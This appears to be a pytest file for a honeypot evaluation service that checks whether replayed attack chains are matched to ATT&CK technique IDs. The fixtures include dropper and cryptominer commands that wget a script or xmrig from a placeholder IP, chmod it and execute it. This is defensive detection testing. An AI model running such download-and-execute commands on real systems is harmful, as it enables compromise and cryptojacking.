from app.services.compaction import CompactedCommand
from app.services.evaluation.static.chains import Chain, load_chains, verify_chain


def _cmd(event_id: str, command: str) -> CompactedCommand:
    return CompactedCommand(
        event_id=event_id, timestamp="2026-08-30T10:00:00Z", command=command
    )


def test_every_chain_declares_expected_techniques() -> None:
    chains = load_chains()
    assert chains
    assert all(c.expected_technique_ids for c in chains)


def test_an_executed_chain_is_verified_through_the_rules_engine() -> None:
    chain = Chain(
        id="dropper",
        steps=["cd /tmp", "wget http://198.51.100.7/x.sh", "chmod 777 x.sh"],
        expected_technique_ids=["T1105", "T1222.002"],
    )
    executed = [
        _cmd("e-1", "cd /tmp"),
        _cmd("e-2", "wget http://198.51.100.7/x.sh"),
        _cmd("e-3", "chmod 777 x.sh"),
    ]

    results = verify_chain(chain, executed)
    observed = {r.expected_technique_id: r for r in results if r.fact_status == "observed"}

    assert "T1105" in observed
    # The evidence chain is the point: technique -> command -> event -> rule.
    assert observed["T1105"].cowrie_event_id == "e-2"
    assert observed["T1105"].matched_rule_id == "T1105"
    assert observed["T1105"].command == "wget http://198.51.100.7/x.sh"


def test_a_technique_the_honeypot_never_produced_is_not_observed() -> None:
    # The honeypot swallowed the chmod, so T1222.002 must come back
    # not_observed -- a real defect signal, distinct from unknown.
    chain = Chain(
        id="dropper",
        steps=["wget http://198.51.100.7/x.sh", "chmod 777 x.sh"],
        expected_technique_ids=["T1105", "T1222.002"],
    )
    executed = [_cmd("e-2", "wget http://198.51.100.7/x.sh")]

    results = {r.expected_technique_id: r for r in verify_chain(chain, executed)}

    assert results["T1105"].fact_status == "observed"
    assert results["T1222.002"].fact_status == "not_observed"
    assert results["T1222.002"].cowrie_event_id is None


def test_evidence_for_a_multiply_hit_technique_is_chosen_by_declared_step_order() -> None:
    # T1496's rulebook pattern matches the bare word "xmrig" with no
    # {CMD_START} anchor, so all three miner steps independently hit it.
    # The evidence must be the LATEST step in chain.steps ("./xmrig"),
    # regardless of what order the executed commands happen to arrive in.
    chain = Chain(
        id="miner",
        steps=["wget http://198.51.100.7/xmrig", "chmod 777 xmrig", "./xmrig"],
        expected_technique_ids=["T1496"],
    )
    in_order = [
        _cmd("e-wget", "wget http://198.51.100.7/xmrig"),
        _cmd("e-chmod", "chmod 777 xmrig"),
        _cmd("e-exec", "./xmrig"),
    ]
    reversed_order = list(reversed(in_order))

    forward_results = {r.expected_technique_id: r for r in verify_chain(chain, in_order)}
    reversed_results = {
        r.expected_technique_id: r for r in verify_chain(chain, reversed_order)
    }

    assert forward_results["T1496"].cowrie_event_id == "e-exec"
    assert reversed_results["T1496"].cowrie_event_id == "e-exec"
    assert forward_results["T1496"].command == "./xmrig"
    assert reversed_results["T1496"].command == "./xmrig"


def test_a_multiply_hit_technique_produces_exactly_one_result_row() -> None:
    # The deterministic score is observed-over-expected across
    # ChainStepResult rows, so a technique hit by several commands must
    # never be allowed to inflate that count.
    chain = Chain(
        id="miner",
        steps=["wget http://198.51.100.7/xmrig", "chmod 777 xmrig", "./xmrig"],
        expected_technique_ids=["T1496"],
    )
    executed = [
        _cmd("e-wget", "wget http://198.51.100.7/xmrig"),
        _cmd("e-chmod", "chmod 777 xmrig"),
        _cmd("e-exec", "./xmrig"),
    ]

    results = verify_chain(chain, executed)

    assert len(results) == 1
    assert results[0].expected_technique_id == "T1496"
